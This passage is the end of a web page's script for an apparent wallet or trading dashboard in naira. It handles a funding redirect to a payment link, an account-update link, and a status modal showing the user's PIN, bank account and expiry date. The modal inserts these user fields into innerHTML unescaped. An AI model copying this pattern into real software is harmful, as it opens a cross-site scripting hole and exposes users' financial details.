        errorDiv.textContent = 'Amount must be between ₦1,000 and ₦20,000';
        errorDiv.style.display = 'block';
      }
    });

    window.fundWallet = function() {
      showLoader("Redirecting to Fund Wallet...", 6000, () => {
        window.open('https://paystack.shop/pay/eyj535dodw','_blank');
      });
    };

    window.updateAccount = function() {
      showLoader("Redirecting to Update Account...", 6000, () => {
        window.open(currentUser.update_link, '_blank');
      });
    };

    window.openStatusModal = function() {
      showLoader("Loading Status...", 1200, () => {
        const user = currentUser;
        const html = `
          <div class="status-row"><span>PIN:</span> ${user.pin}</div>
          <div class="status-row"><span>Referral code:</span> ${user.referral_code || ''}</div>
          <div class="status-row"><span>Register date:</span> ${user.registered}</div>
          <div class="status-row"><span>Account name:</span> ${user.account_name}</div>
          <div class="status-row"><span>Account number:</span> ${user.account_number}</div>
          <div class="status-row"><span>Bank name:</span> ${user.bank}</div>
          <div class="status-row"><span>Beneficiary's number:</span> ${user.beneficiary}</div>
          <div class="status-row"><span>Expiry date:</span> ${user.expiry}</div>
        `;
        document.getElementById('status-content').innerHTML = html;
        document.getElementById('status-modal').classList.add('active');
      });
    };
    function closeStatusModal() {
      document.getElementById('status-modal').classList.remove('active');
    }

    document.addEventListener('mousedown', function(e){
      if (document.getElementById('status-modal').classList.contains('active')) {
        if (!e.target.closest('.status-modal-card')) closeStatusModal();
      }
      if (document.getElementById('trade-form-modal').classList.contains('active')) {
        if (!e.target.closest('.trade-form-modal-card')) closeTradeFormModal();
      }
      if (document.getElementById('withdrawal-form-modal').classList.contains('active')) {
        if (!e.target.closest('.withdrawal-form-modal-card')) closeWithdrawalFormModal();
      }
    });
  </script>
</body>
</html>
